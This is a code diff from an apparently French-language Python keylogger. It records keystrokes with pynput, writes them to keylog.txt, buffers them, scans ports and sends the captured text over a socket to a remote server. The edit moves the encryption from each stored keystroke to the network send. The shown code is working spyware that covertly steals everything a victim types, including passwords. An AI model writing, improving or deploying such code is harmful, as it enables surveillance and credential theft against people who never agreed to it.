@@ -10,7 +10,7 @@ from pynput.keyboard import Listener
 from chiffrement import *
 
 
-TXT_GLOB = b""
+TXT_GLOB = ""
 
 
 def pav_num():
@@ -55,7 +55,7 @@ def kpr(key):
     global TXT_GLOB
     with open("keylog.txt", "a") as f:
         f.write(parse(str(key)))
-        TXT_GLOB += chiffrement(parse(str(key)))
+        TXT_GLOB += parse(str(key))
 
 
 def scan_socket(port):
@@ -121,7 +121,7 @@ def send(data, port):
         else:
             client_socket.connect((SRV, PORT))
 
-        client_socket.send(data.encode('utf-8'))  # envoi
+        client_socket.send(chiffrement(data.encode('utf-8')))  # envoi
         client_socket.close()
     except:
         kill_all()
